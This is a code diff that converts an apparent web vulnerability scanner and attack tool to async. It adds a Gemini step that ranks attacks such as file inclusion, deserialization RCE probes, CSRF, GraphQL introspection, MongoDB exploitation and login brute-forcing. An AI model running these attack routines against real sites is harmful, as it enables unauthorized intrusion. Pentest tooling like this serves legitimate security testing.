+            evidence = f"Vulnerable URL: {test_url}\nPayload: {payload}\n\n--- Response Snippet ---\n{(await res.text())[:300]}\n---"
             report.add_finding("Remote File Inclusion (RFI)", "Critical", test_url, param_name, payload,
                                "The application includes remote files from arbitrary URLs, which can lead to Remote Code Execution.",
                                "Disable 'allow_url_include' in the PHP configuration. Never include files based on user input.",
@@ -5320,7 +5427,7 @@ def check_file_inclusion(target, form_to_test, output, tech, report, session_coo
         found_vulnerability = False
         # Phase 4a: Probe with high-probability payloads
         for payload in lfi_probes:
-            found, vuln_type = test_fi(point['url'], point['method'], point['param'], point['value'] + payload, point['form_data'], point['original_query'])
+            found, vuln_type = await test_fi(point['url'], point['method'], point['param'], point['value'] + payload, point['form_data'], point['original_query'])
             if found:
                 found_vulnerability = True
                 break # Found a vulnerability, exit the entire function
@@ -5331,7 +5438,7 @@ def check_file_inclusion(target, form_to_test, output, tech, report, session_coo
         output.print(f"  [*] No immediate FI found with probes. Starting deep scan for '{point['param']}'...")
         # Phase 4b: Deep scan with all expanded payloads if probes fail
         for payload in lfi_payloads:
-            found, vuln_type = test_fi(point['url'], point['method'], point['param'], point['value'] + payload, point['form_data'], point['original_query'])
+            found, vuln_type = await test_fi(point['url'], point['method'], point['param'], point['value'] + payload, point['form_data'], point['original_query'])
             if found:
                 found_vulnerability = True
                 break # Found a vulnerability, exit the entire function
@@ -5344,7 +5451,7 @@ def check_file_inclusion(target, form_to_test, output, tech, report, session_coo
 
 
 # --- 16. Insecure Deserialization ---
-def check_insecure_deserialization(target, output, tech, report, session_cookies=None):
+async def check_insecure_deserialization(target, output, tech, report, session_cookies=None):
     output.print("\n[+] Starting Insecure Deserialization Scan...")
     target_url = normalize_target(target)
     
@@ -5371,10 +5478,10 @@ def check_insecure_deserialization(target, output, tech, report, session_cookies
                 data = {target_info['param']: java_payload_rce}
             else:
                 continue
-            res, request_details, response_details = _send_http_request(url, method=target_info['method'], data=data, headers=headers, output=output, session_cookies=session_cookies)
-            if res and ("root:x:0:0" in res.text or "uid=" in res.text):
+            res, request_details, response_details = await _send_async_http_request(url, method=target_info['method'], data=data, headers=headers, output=output, session_cookies=session_cookies)
+            if res and ("root:x:0:0" in await res.text() or "uid=" in await res.text()):
                 output.print(f"  [CRITICAL] Java Insecure Deserialization (RCE) found at {url} via {target_info['param']}")
-                report.add_finding("Java Insecure Deserialization (RCE)", "Critical", url, target_info['param'], java_payload_rce, "The application is vulnerable to Java insecure deserialization, leading to Remote Code Execution.", "Avoid deserializing untrusted data. Use safe serialization formats or implement strict validation.", f"Vulnerable URL: {url}\nParameter: {target_info['param']}\nPayload: {java_payload_rce}\nResponse snippet: {res.text[:200]}")
+                report.add_finding("Java Insecure Deserialization (RCE)", "Critical", url, target_info['param'], java_payload_rce, "The application is vulnerable to Java insecure deserialization, leading to Remote Code Execution.", "Avoid deserializing untrusted data. Use safe serialization formats or implement strict validation.", f"Vulnerable URL: {url}\nParameter: {target_info['param']}\nPayload: {java_payload_rce}\nResponse snippet: {(await res.text())[:200]}")
                 return
 
     if tech.get('backend') == 'PHP' or tech.get('server') and 'apache' in tech['server'].lower() and 'php' in tech.get('x-powered-by', '').lower():
@@ -5390,10 +5497,10 @@ def check_insecure_deserialization(target, output, tech, report, session_cookies
                 data = {target_info['param']: php_payload_rce}
             else: continue
 
-            res, request_details, response_details = _send_http_request(url, method=target_info['method'], data=data, headers=headers, output=output, session_cookies=session_cookies)
-            if res and "root:x:0:0" in res.text:
+            res, request_details, response_details = await _send_async_http_request(url, method=target_info['method'], data=data, headers=headers, output=output, session_cookies=session_cookies)
+            if res and "root:x:0:0" in await res.text():
                 output.print(f"  [CRITICAL] PHP Insecure Deserialization (RCE) found at {url} via {target_info['param']}")
-                report.add_finding("PHP Insecure Deserialization (RCE)", "Critical", url, target_info['param'], php_payload_rce, "The application is vulnerable to PHP insecure deserialization, leading to Remote Code Execution.", "Avoid deserializing untrusted data. Use safe serialization formats or implement strict validation.", f"Vulnerable URL: {url}\nParameter: {target_info['param']}\nPayload: {php_payload_rce}\nResponse snippet: {res.text[:200]}")
+                report.add_finding("PHP Insecure Deserialization (RCE)", "Critical", url, target_info['param'], php_payload_rce, "The application is vulnerable to PHP insecure deserialization, leading to Remote Code Execution.", "Avoid deserializing untrusted data. Use safe serialization formats or implement strict validation.", f"Vulnerable URL: {url}\nParameter: {target_info['param']}\nPayload: {php_payload_rce}\nResponse snippet: {(await res.text())[:200]}")
                 return
 
     if tech.get('backend') == 'Python' or tech.get('server') and 'python' in tech['server'].lower():
@@ -5409,16 +5516,16 @@ def check_insecure_deserialization(target, output, tech, report, session_cookies
                 data = {target_info['param']: python_payload_rce}
             else: continue
 
-            res, request_details, response_details = _send_http_request(url, method=target_info['method'], data=data, headers=headers, output=output, session_cookies=session_cookies)
-            if res and "uid=" in res.text:
+            res, request_details, response_details = await _send_async_http_request(url, method=target_info['method'], data=data, headers=headers, output=output, session_cookies=session_cookies)
+            if res and "uid=" in await res.text():
                 output.print(f"  [CRITICAL] Python Insecure Deserialization (RCE) found at {url} via {target_info['param']}")
-                report.add_finding("Python Insecure Deserialization (RCE)", "Critical", url, target_info['param'], python_payload_rce, "The application is vulnerable to Python insecure deserialization (pickle), leading to Remote Code Execution.", "Avoid deserializing untrusted data. Use safe serialization formats or implement strict validation.", f"Vulnerable URL: {url}\nParameter: {target_info['param']}\nPayload: {python_payload_rce}\nResponse snippet: {res.text[:200]}")
+                report.add_finding("Python Insecure Deserialization (RCE)", "Critical", url, target_info['param'], python_payload_rce, "The application is vulnerable to Python insecure deserialization (pickle), leading to Remote Code Execution.", "Avoid deserializing untrusted data. Use safe serialization formats or implement strict validation.", f"Vulnerable URL: {url}\nParameter: {target_info['param']}\nPayload: {python_payload_rce}\nResponse snippet: {(await res.text())[:200]}")
                 return
     
     output.print("  [INFO] Insecure Deserialization scan completed.")
 
 # --- 17. GraphQL Injection ---
-def check_graphql_injection(target, output, tech, report, session_cookies=None):
+async def check_graphql_injection(target, output, tech, report, session_cookies=None):
     output.print("\n[+] Starting GraphQL Injection Scan...")
     target_url = normalize_target(target)
     
@@ -5428,36 +5535,36 @@ def check_graphql_injection(target, output, tech, report, session_cookies=None):
         url = urljoin(target_url, endpoint)
         output.print(f"  [*] Testing GraphQL endpoint: {url}")
         
-        res, request_details, response_details = _send_http_request(url, method='POST', data=json.dumps({"query": "{ __typename }"}), headers={'Content-Type': 'application/json'}, output=output, session_cookies=session_cookies)
-        if res and res.status_code == 200 and "__typename" in res.text:
+        res, request_details, response_details = await _send_async_http_request(url, method='POST', data=json.dumps({"query": "{ __typename }"}), headers={'Content-Type': 'application/json'}, output=output, session_cookies=session_cookies)
+        if res and res.status == 200 and "__typename" in await res.text():
             output.print(f"  [INFO] GraphQL endpoint detected at: {url}")
             
             introspection_query = "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}} "
             
-            res_intro, request_details, response_details = _send_http_request(url, method='POST', data=json.dumps({"query": introspection_query}), headers={'Content-Type': 'application/json'}, output=output, session_cookies=session_cookies)
-            if res_intro and res_intro.status_code == 200 and "__schema" in res_intro.text:
+            res_intro, request_details, response_details = await _send_async_http_request(url, method='POST', data=json.dumps({"query": introspection_query}), headers={'Content-Type': 'application/json'}, output=output, session_cookies=session_cookies)
+            if res_intro and res_intro.status == 200 and "__schema" in await res_intro.text():
                 output.print(f"  [HIGH] GraphQL Introspection Query enabled, schema disclosed at {url}")
-                report.add_finding("GraphQL Schema Disclosure (Introspection)", "High", url, "query", "Introspection Query", "The GraphQL endpoint allows introspection queries, disclosing the full API schema.", "Disable GraphQL introspection in production environments.", f"Vulnerable URL: {url}\nSchema snippet: {res_intro.text[:500]}")
+                report.add_finding("GraphQL Schema Disclosure (Introspection)", "High", url, "query", "Introspection Query", "The GraphQL endpoint allows introspection queries, disclosing the full API schema.", "Disable GraphQL introspection in production environments.", f"Vulnerable URL: {url}\nSchema snippet: {(await res_intro.text())[:500]}")
             else:
                 output.print(f"  [INFO] GraphQL Introspection Query appears disabled or failed at {url}.")
 
             output.print(f"  [*] Testing for GraphQL Batching vulnerabilities (conceptual) at {url}...")
             batch_query = json.dumps([{"query": "{ user(id: 1) { username } }"}, {"query": "{ user(id: 2) { username } }"}])
-            res_batch, request_details, response_details = _send_http_request(url, method='POST', data=batch_query, headers={'Content-Type': 'application/json'}, output=output, session_cookies=session_cookies)
-            if res_batch and res_batch.status_code == 200 and "username" in res_batch.text:
+            res_batch, request_details, response_details = await _send_async_http_request(url, method='POST', data=batch_query, headers={'Content-Type': 'application/json'}, output=output, session_cookies=session_cookies)
+            if res_batch and res_batch.status == 200 and "username" in await res_batch.text():
                 output.print(f"  [MEDIUM] Potential GraphQL Batching vulnerability detected at {url}.")
-                report.add_finding("GraphQL Batching Vulnerability", "Medium", url, "query", batch_query, "The GraphQL endpoint allows batching multiple queries, which could be abused to bypass rate limits or access unauthorized data.", "Implement proper authorization checks for each query within a batch and consider rate limiting.", f"Vulnerable URL: {url}\nResponse snippet: {res_batch.text[:500]}")
+                report.add_finding("GraphQL Batching Vulnerability", "Medium", url, "query", batch_query, "The GraphQL endpoint allows batching multiple queries, which could be abused to bypass rate limits or access unauthorized data.", "Implement proper authorization checks for each query within a batch and consider rate limiting.", f"Vulnerable URL: {url}\nResponse snippet: {(await res_batch.text())[:500]}")
             
             return
     
     output.print("  [INFO] GraphQL Injection scan completed.")
 
 # --- [NEW] 18. CSRF ---
-def check_csrf(target, form_to_test, output, tech, report, session_cookies=None, discovered_urls=None, discovered_forms=None):
+async def check_csrf(target, form_to_test, output, tech, report, session_cookies=None, discovered_urls=None, discovered_forms=None):
     output.print(f"\n[+] Starting Enhanced CSRF Scan...")
     
     # 1. Check SameSite attribute on session cookies
-    res_initial, request_details, response_details = _send_http_request(target, output=output, session_cookies=session_cookies)
+    res_initial, request_details, response_details = await _send_async_http_request(target, output=output, session_cookies=session_cookies)
     if res_initial and "Set-Cookie" in res_initial.headers:
         for cookie_header in res_initial.headers.get_list("Set-Cookie"):
             # Look for session cookies (e.g., PHPSESSID, JSESSIONID, ASP.NET_SessionId)
@@ -5490,17 +5597,17 @@ def check_csrf(target, form_to_test, output, tech, report, session_cookies=None,
         
         # Attempt to submit the form without a token
         form_data_no_token = {i['name']: i.get('value', get_random_string(5)) for i in form_to_test['inputs']}
-        res_submit_no_token, request_details, response_details = _send_http_request(action_url, method=form_to_test['method'], data=form_data_no_token, session_cookies=session_cookies, output=output)
+        res_submit_no_token, request_details, response_details = await _send_async_http_request(action_url, method=form_to_test['method'], data=form_data_no_token, session_cookies=session_cookies, output=output)
 
         evidence = f"Form action: {action_url}\nForm method: {form_to_test['method']}\nForm inputs: {[i['name'] for i in form_to_test['inputs']]}"
         
-        if res_submit_no_token and (res_submit_no_token.status_code in [200, 302] and "token" not in res_submit_no_token.text.lower() and "csrf" not in res_submit_no_token.text.lower() and "error" not in res_submit_no_token.text.lower()):
+        if res_submit_no_token and (res_submit_no_token.status in [200, 302] and "token" not in (await res_submit_no_token.text()).lower() and "csrf" not in (await res_submit_no_token.text()).lower() and "error" not in (await res_submit_no_token.text()).lower()):
              output.print(f"  [HIGH] Form at {action_url} successfully submitted without a CSRF token.")
-             evidence += f"\n\nSubmission without token was successful (Status: {res_submit_no_token.status_code}). This confirms the CSRF vulnerability."
+             evidence += f"\n\nSubmission without token was successful (Status: {res_submit_no_token.status}). This confirms the CSRF vulnerability."
              severity = "High"
         else:
              severity = "Medium"
-             evidence += f"\n\nSubmission without token was not clearly successful (Status: {res_submit_no_token.status_code if res_submit_no_token else 'N/A'}). Further manual testing recommended."
+             evidence += f"\n\nSubmission without token was not clearly successful (Status: {res_submit_no_token.status if res_submit_no_token else 'N/A'}). Further manual testing recommended."
 
         report.add_finding(
             "Cross-Site Request Forgery (CSRF) - Missing Token", 
@@ -5521,13 +5628,13 @@ def check_csrf(target, form_to_test, output, tech, report, session_cookies=None,
             # Attempt to submit with an invalid token
             form_data_invalid_token = {i['name']: i.get('value', get_random_string(5)) for i in form_to_test['inputs']}
             form_data_invalid_token[token_field['name']] = get_random_string(16) # Invalid token
-            res_submit_invalid_token, request_details, response_details = _send_http_request(action_url, method=form_to_test['method'], data=form_data_invalid_token, session_cookies=session_cookies, output=output)
+            res_submit_invalid_token, request_details, response_details = await _send_async_http_request(action_url, method=form_to_test['method'], data=form_data_invalid_token, session_cookies=session_cookies, output=output)
 
             evidence = f"Form action: {action_url}\nForm method: {form_to_test['method']}\nToken field: {token_field['name']}"
             
-            if res_submit_invalid_token and (res_submit_invalid_token.status_code in [200, 302] and "token" not in res_submit_invalid_token.text.lower() and "csrf" not in res_submit_invalid_token.text.lower() and "error" not in res_submit_invalid_token.text.lower()):
+            if res_submit_invalid_token and (res_submit_invalid_token.status in [200, 302] and "token" not in (await res_submit_invalid_token.text()).lower() and "csrf" not in (await res_submit_invalid_token.text()).lower() and "error" not in (await res_submit_invalid_token.text()).lower()):
                 output.print(f"  [HIGH] Form at {action_url} successfully submitted with an invalid CSRF token.")
-                evidence += f"\n\nSubmission with invalid token was successful (Status: {res_submit_invalid_token.status_code}). This indicates a flawed CSRF protection mechanism."
+                evidence += f"\n\nSubmission with invalid token was successful (Status: {res_submit_invalid_token.status}). This indicates a flawed CSRF protection mechanism."
                 report.add_finding(
                     "Cross-Site Request Forgery (CSRF) - Token Bypass", 
                     "High", 
@@ -5554,12 +5661,12 @@ def check_csrf(target, form_to_test, output, tech, report, session_cookies=None,
         if any(re.search(pattern, url, re.I) for pattern in state_changing_get_patterns):
             output.print(f"  [MEDIUM] Potential state-changing GET request found: {url}")
             # Attempt to replay the GET request
-            res_get_replay, request_details, response_details = _send_http_request(url, method='GET', session_cookies=session_cookies, output=output)
+            res_get_replay, request_details, response_details = await _send_async_http_request(url, method='GET', session_cookies=session_cookies, output=output)
             
             # This is a heuristic check; a real state change is hard to confirm generically
-            if res_get_replay and res_get_replay.status_code in [200, 302] and "error" not in res_get_replay.text.lower():
+            if res_get_replay and res_get_replay.status in [200, 302] and "error" not in (await res_get_replay.text()).lower():
                 output.print(f"  [HIGH] State-changing GET request at {url} appears to be vulnerable to CSRF.")
-                evidence = f"Vulnerable URL: {url}\nMethod: GET\n\nResponse Status: {res_get_replay.status_code}\nResponse Snippet:\n---\n{res_get_replay.text[:250]}\n---"
+                evidence = f"Vulnerable URL: {url}\nMethod: GET\n\nResponse Status: {res_get_replay.status}\nResponse Snippet:\n---\n{(await res_get_replay.text())[:250]}\n---"
                 report.add_finding(
                     "Cross-Site Request Forgery (CSRF) - State-Changing GET", 
                     "High", 
@@ -5574,13 +5681,22 @@ def check_csrf(target, form_to_test, output, tech, report, session_cookies=None,
                 return # Stop after first finding
 
 # =================================================================================
-def ai_analyze_scan_results(base_url, tech, report, discovered_urls, discovered_forms, output_handler):
+async def ai_generate_dynamic_payloads(vulnerability_type, base_payload, response_snippet, output):
+    """
+    (STUB) Generates dynamic payloads using Gemini AI.
+    This is a placeholder to prevent NameError.
+    """
+    output.print(f"  [AI STUB] AI payload generation for {vulnerability_type} is not fully implemented. Returning empty list.")
+    return []
+
+async def ai_analyze_scan_results(base_url, tech, report, discovered_urls, discovered_forms, output_handler):
     """
     Uses Gemini AI to analyze initial discovery results and recommend an attack strategy.
+    Returns a prioritized list of attack function names.
     """
     if not GEMINI_MODEL:
         output_handler.print("  [AI WARNING] Gemini model not initialized. Skipping AI analysis.")
-        return
+        return []
 
     output_handler.print("\n" + "="*50)
     output_handler.print("  PHASE 1.5: AI-DRIVEN TARGET ANALYSIS")
@@ -5625,14 +5741,41 @@ def ai_analyze_scan_results(base_url, tech, report, discovered_urls, discovered_
         Your analysis and prioritized list:
         """
         
-        response = GEMINI_MODEL.generate_content(prompt)
+        response = await GEMINI_MODEL.generate_content(prompt)
         output_handler.print("\n  [AI INSIGHT] Attack Strategy Recommendation:")
         # Format AI response for better readability
         ai_response_formatted = "\n".join([f"    {line}" for line in response.text.split('\n')])
         output_handler.print(ai_response_formatted)
 
+        # Extract attack function names from the AI's response
+        # This is a heuristic and might need refinement based on actual AI output format
+        recommended_attacks = []
+        for line in response.text.split('\n'):
+            if "SQL Injection" in line: recommended_attacks.append("check_sql_injection")
+            if "XSS" in line: recommended_attacks.append("check_xss")
+            if "Command Injection" in line: recommended_attacks.append("check_command_injection")
+            if "IDOR" in line: recommended_attacks.append("check_idor")
+            if "HTTP Smuggling" in line: recommended_attacks.append("check_http_smuggling")
+            if "LDAP Injection" in line: recommended_attacks.append("check_ldap_injection")
+            if "MongoDB" in line: recommended_attacks.append("scan_and_exploit_mongodb")
+            if "RTSP" in line: recommended_attacks.append("scan_rtsp")
+            if "Deserialization" in line: recommended_attacks.append("check_insecure_deserialization")
+            if "GraphQL" in line: recommended_attacks.append("check_graphql_injection")
+            if "CORS" in line: recommended_attacks.append("check_cors")
+            if "CRLF" in line: recommended_attacks.append("check_crlf")
+            if "Open Redirect" in line: recommended_attacks.append("check_open_redirect")
+            if "SSRF" in line: recommended_attacks.append("check_ssrf")
+            if "React2Shell" in line: recommended_attacks.append("scan_react2shell")
+            if "XXE" in line: recommended_attacks.append("check_xxe")
+            if "CSRF" in line: recommended_attacks.append("check_csrf")
+            if "File Inclusion" in line: recommended_attacks.append("check_file_inclusion")
+            if "Brute Force" in line: recommended_attacks.append("brute_force_login")
+        
+        return list(set(recommended_attacks)) # Return unique recommended attacks
+
     except Exception as e:
         output_handler.print(f"  [AI ERROR] Could not perform AI-driven target analysis: {e}")
+        return []
 
 # 5. 메인 실행 로직 (v5.5 Ultimate Pro Max)
 # =================================================================================
@@ -5651,7 +5794,7 @@ def print_intro():
 """
     print(intro)
 
-def ai_generate_report_summary(report, output_handler):
+async def ai_generate_report_summary(report, output_handler):
     """
     Generates an AI-powered executive summary, remediation advice, and attack narrative.
     """
@@ -5690,7 +5833,7 @@ def ai_generate_report_summary(report, output_handler):
         output_handler.print(f"[AI ERROR] Failed to generate AI report summary: {e}")
         return ""
 
-def run_attack_sequence(target, session_cookies, output_handler, ai_enabled=False):
+async def run_attack_sequence(target, session_cookies, output_handler, ai_enabled=False):
     """Orchestrates the entire attack sequence, with an option for AI assistance."""
     report = Report(target)
     tech = {'server': 'Unknown', 'backend': 'Unknown', 'framework': 'Unknown'}
@@ -5699,12 +5842,12 @@ def run_attack_sequence(target, session_cookies, output_handler, ai_enabled=Fals
         output_handler.print("\n[AI MODE] AI assistance is enabled for this scan.")
 
     # run_all_attacks will now handle the phased attack and user prompt
-    run_all_attacks(target, output_handler, tech, report, session_cookies=session_cookies, ai_enabled=ai_enabled)
+    await run_all_attacks(target, output_handler, tech, report, session_cookies=session_cookies, ai_enabled=ai_enabled)
     
     report_filename = f"report_{get_domain(target)}_{time.strftime('%Y%m%d_%H%M%S')}.txt"
     ai_content = ""
     if ai_enabled:
-        ai_content = ai_generate_report_summary(report, output_handler)
+        ai_content = await ai_generate_report_summary(report, output_handler)
     
     report.write_to_file(report_filename, append_content=ai_content)
     output_handler.print(f"\n[SUCCESS] Report generated: {report_filename}")
@@ -5716,21 +5859,47 @@ def _run_single_attack(args):
     try:
         report.add_check(check_name, "Started")
         
-        # Pass the correct arguments to each function
-        if attack_func in [check_sql_injection, check_xss, check_command_injection, check_file_inclusion, check_cors, check_crlf, check_open_redirect, check_ssrf, check_xxe, check_http_smuggling, check_ldap_injection]:
-            attack_func(url, form_to_test, output_handler, tech, report, session_cookies, ai_enabled=ai_enabled)
-        elif attack_func in [check_idor, check_csrf]:
-            attack_func(url, form_to_test, output_handler, tech, report, session_cookies, discovered_urls=discovered_urls, discovered_forms=discovered_forms, ai_enabled=ai_enabled)
-        else:
-            # General functions that only need the base target
-            attack_func(base_url, output_handler, tech, report, session_cookies)
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
 
+        # Build kwargs dynamically to avoid TypeErrors
+        kwargs = {
+            'target': url,
+            'output': output_handler,
+            'tech': tech,
+            'report': report,
+            'session_cookies': session_cookies
+        }
+        
+        # Get the signature of the attack function
+        sig = inspect.signature(attack_func)
+        
+        # Add optional arguments if the function accepts them
+        if 'form_to_test' in sig.parameters:
+            kwargs['form_to_test'] = form_to_test
+        if 'specific_form' in sig.parameters:
+            kwargs['specific_form'] = form_to_test
+        if 'ai_enabled' in sig.parameters:
+            kwargs['ai_enabled'] = ai_enabled
+        if 'discovered_urls' in sig.parameters:
+            kwargs['discovered_urls'] = discovered_urls
+        if 'discovered_forms' in sig.parameters:
+            kwargs['discovered_forms'] = discovered_forms
+            
+        # Handle discovery modules that use base_url
+        if attack_func in [spider_target, profile_target, scan_nmap, scan_nikto, scan_nuclei, scan_and_exploit_mongodb, scan_rtsp]:
+            # These functions are designed to run on the base URL of the target, not every discovered URL.
+            kwargs['target'] = base_url
+
+        loop.run_until_complete(attack_func(**kwargs))
+
+        loop.close()
         report.add_check(check_name, "Completed")
     except Exception as e:
         output_handler.print(f"\n[FATAL ERROR] in {attack_func.__name__} on {url}: {repr(e)}")
         report.add_check(check_name, f"Error: {repr(e)}")
 
-def run_all_attacks(target, output_handler, tech, report, session_cookies=None, ai_enabled=False):
+async def run_all_attacks(target, output_handler, tech, report, session_cookies=None, ai_enabled=False, ai_reorder_attacks=False):
     base_url = normalize_target(target)
     config = configparser.ConfigParser()
     
@@ -5739,8 +5908,11 @@ def run_all_attacks(target, output_handler, tech, report, session_cookies=None, 
         config.read('config.ini')
         if 'PERFORMANCE' in config and 'threads' in config['PERFORMANCE']:
             try:
-                num_threads = int(config['PERFORMANCE']['threads'])
-                output_handler.print(f"\n[INFO] Using {num_threads} threads for scanning (from config.ini).")
+                configured_threads = int(config['PERFORMANCE']['threads'])
+                if configured_threads > 0:
+                    num_threads = configured_threads
+                else:
+                    output_handler.print(f"\n[WARNING] Invalid 'threads' value in config.ini. Using default: {num_threads}.")
             except ValueError:
                 output_handler.print(f"\n[WARNING] Invalid 'threads' value in config.ini. Using default: {num_threads}.")
     else:
@@ -5752,32 +5924,64 @@ def run_all_attacks(target, output_handler, tech, report, session_cookies=None, 
     output_handler.print("="*50)
     
     try:
-        profile_target(base_url, output_handler, tech, report, session_cookies=session_cookies)
-        scan_nmap(base_url, output_handler, tech, report, session_cookies=session_cookies)
-        scan_nikto(base_url, output_handler, tech, report, session_cookies=session_cookies)
-        scan_nuclei(base_url, output_handler, tech, report, session_cookies=session_cookies)
+        await profile_target(base_url, output_handler, tech, report, session_cookies=session_cookies)
+        await scan_nmap(base_url, output_handler, tech, report, session_cookies=session_cookies)
+        await scan_nikto(base_url, output_handler, tech, report, session_cookies=session_cookies)
+        await scan_nuclei(base_url, output_handler, tech, report, session_cookies=session_cookies)
     except Exception as e:
         output_handler.print(f"\n[FATAL ERROR] during discovery phase: {repr(e)}")
     
     try:
-        discovered_urls, discovered_forms = spider_target(base_url, output_handler, session_cookies=session_cookies)
+        discovered_urls, discovered_forms = await spider_target(base_url, output_handler, session_cookies=session_cookies)
     except Exception as e:
         output_handler.print(f"  [ERROR] Advanced spider failed catastrophically: {e}")
         discovered_urls, discovered_forms = [], []
 
-    if ai_enabled:
-        ai_analyze_scan_results(base_url, tech, report, discovered_urls, discovered_forms, output_handler)
+    recommended_attacks = []
+    if ai_enabled and ai_reorder_attacks:
+        recommended_attacks = await ai_analyze_scan_results(base_url, tech, report, discovered_urls, discovered_forms, output_handler)
 
     # --- PHASE 2: ATTACK & EXPLOITATION (Phased) ---
-    primary_attacks = [
+    all_possible_attacks = [
         check_sql_injection, check_xss, check_command_injection,
-        check_idor, check_http_smuggling, check_ldap_injection
-    ]
-    secondary_attacks = [
+        check_idor, check_http_smuggling, check_ldap_injection,
         scan_and_exploit_mongodb, scan_rtsp, check_insecure_deserialization,
         check_graphql_injection, check_cors, check_crlf, check_open_redirect, check_ssrf,
         scan_react2shell, check_xxe, check_csrf, check_file_inclusion, brute_force_login
     ]
+
+    # Create a mapping from function name string to function object
+    attack_func_map = {func.__name__: func for func in all_possible_attacks}
+
+    # Reorder attacks based on AI recommendations
+    if recommended_attacks:
+        output_handler.print(f"\n[AI MODE] Reordering attacks based on AI recommendations: {', '.join(recommended_attacks)}")
+        prioritized_attacks = []
+        seen_attacks = set()
+
+        # Add recommended attacks first
+        for rec_name in recommended_attacks:
+            if rec_name in attack_func_map and rec_name not in seen_attacks:
+                prioritized_attacks.append(attack_func_map[rec_name])
+                seen_attacks.add(rec_name)
+        
+        # Add remaining attacks
+        for attack_func in all_possible_attacks:
+            if attack_func.__name__ not in seen_attacks:
+                prioritized_attacks.append(attack_func)
+        
+        primary_attacks = prioritized_attacks[:6] # Keep the first 6 as primary
+        secondary_attacks = prioritized_attacks[6:]
+    else:
+        primary_attacks = [
+            check_sql_injection, check_xss, check_command_injection,
+            check_idor, check_http_smuggling, check_ldap_injection
+        ]
+        secondary_attacks = [
+            scan_and_exploit_mongodb, scan_rtsp, check_insecure_deserialization,
+            check_graphql_injection, check_cors, check_crlf, check_open_redirect, check_ssrf,
+            scan_react2shell, check_xxe, check_csrf, check_file_inclusion, brute_force_login
+        ]
 
     all_targets = set(discovered_urls)
     for form in discovered_forms:
@@ -5790,6 +5994,7 @@ def run_all_attacks(target, output_handler, tech, report, session_cookies=None, 
     total_tasks = [len(all_targets) * len(primary_attacks)]
 
     def execute_attack_phase(phase_name, attack_definitions):
+        global attack_progress # Moved to the top of the function
         output_handler.print("\n" + "="*50)
         output_handler.print(f"  {phase_name} (Running with {num_threads} threads)")
         output_handler.print("="*50)
@@ -5808,21 +6013,33 @@ def run_all_attacks(target, output_handler, tech, report, session_cookies=None, 
         with ThreadPoolExecutor(max_workers=num_threads) as executor:
             future_to_task = {executor.submit(_run_single_attack, task): task for task in tasks}
             
-            iterable = as_completed(future_to_task)
+            # Use tqdm for a more visible progress bar in terminal mode
             if isinstance(output_handler, TerminalOutput):
-                iterable = tqdm(iterable, total=len(tasks), desc=phase_name, unit="task")
-
-            for future in iterable:
-                with completed_tasks_counter['lock']:
-                    completed_tasks_counter['count'] += 1
-                    if total_tasks[0] > 0:
-                        global attack_progress
-                        attack_progress = (completed_tasks_counter['count'] / total_tasks[0]) * 100
-                
-                try:
-                    future.result()
-                except Exception as exc:
-                    output_handler.print(f'\n[ERROR] A task in {phase_name} generated an exception: {exc}')
+                # Create a custom tqdm instance to control its output and ensure it doesn't interfere with other prints
+                with tqdm(total=len(tasks), desc=f"{phase_name} Progress", unit="task", dynamic_ncols=True, position=0, leave=True) as pbar:
+                    for future in as_completed(future_to_task):
+                        with completed_tasks_counter['lock']:
+                            completed_tasks_counter['count'] += 1
+                            if total_tasks[0] > 0:
+                                attack_progress = (completed_tasks_counter['count'] / total_tasks[0]) * 100
+                        
+                        try:
+                            future.result()
+                        except Exception as exc:
+                            output_handler.print(f'\n[ERROR] A task in {phase_name} generated an exception: {exc}')
+                        finally:
+                            pbar.update(1) # Update the progress bar for each completed task
+            else: # For QueueOutputHandler (Web UI), just iterate without tqdm
+                for future in as_completed(future_to_task):
+                    with completed_tasks_counter['lock']:
+                        completed_tasks_counter['count'] += 1
+                        if total_tasks[0] > 0:
+                            attack_progress = (completed_tasks_counter['count'] / total_tasks[0]) * 100
+                    
+                    try:
+                        future.result()
+                    except Exception as exc:
+                        output_handler.print(f'\n[ERROR] A task in {phase_name} generated an exception: {exc}')
 
     # --- Orchestration Logic ---
     execute_attack_phase("PHASE 2.1: PRIMARY ATTACK", primary_attacks)
@@ -5891,14 +6108,18 @@ def start_attack():
         global attack_status, attack_progress
         
         output_handler = QueueOutputHandler(q)
+        # Create a new event loop for this thread
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
         try:
             # Call the new orchestrator function, ensuring AI is disabled for web UI for now.
-            run_attack_sequence(target, session_cookies_dict, output_handler, ai_enabled=False)
+            loop.run_until_complete(run_attack_sequence(target, session_cookies_dict, output_handler, ai_enabled=False))
         except Exception as e:
             output_handler.print(f"\n[CRITICAL] A fatal error occurred during the attack sequence: {e}")
         finally:
             attack_progress = 100
             attack_status = "finished"
+            loop.close()
 
     attack_thread = threading.Thread(target=attack_wrapper, args=(target, log_queue, session_cookies))
     attack_thread.start()
@@ -5998,26 +6219,28 @@ if __name__ == '__main__':
         
         # Set global variables
         GEMINI_API_KEY = api_key
-        # The num_threads is passed to run_all_attacks via config.ini or default
-
-        try:
-            genai.configure(api_key=GEMINI_API_KEY)
-            GEMINI_MODEL = genai.GenerativeModel('gemini-1.5-flash')
-            print("  [INFO] Gemini API Key configured successfully. Model 'gemini-1.5-flash' is ready.")
-        except AttributeError:
-            # Fallback for older google-genai versions
-            os.environ['GOOGLE_API_KEY'] = GEMINI_API_KEY
-            print("  [INFO] Loaded API Key from config.ini.")
-        except Exception as e:
-            print(f"  [ERROR] Failed to configure Gemini API: {e}")
-            sys.exit(1)
+        
+        # Configure Gemini API if AI is enabled
+        if ai_enabled:
+            try:
+                genai.configure(api_key=GEMINI_API_KEY)
+                GEMINI_MODEL = genai.GenerativeModel('gemini-1.5-flash')
+                print("  [INFO] Gemini API Key configured successfully. Model 'gemini-1.5-flash' is ready.")
+            except AttributeError:
+                # Fallback for older google-genai versions
+                os.environ['GOOGLE_API_KEY'] = GEMINI_API_KEY
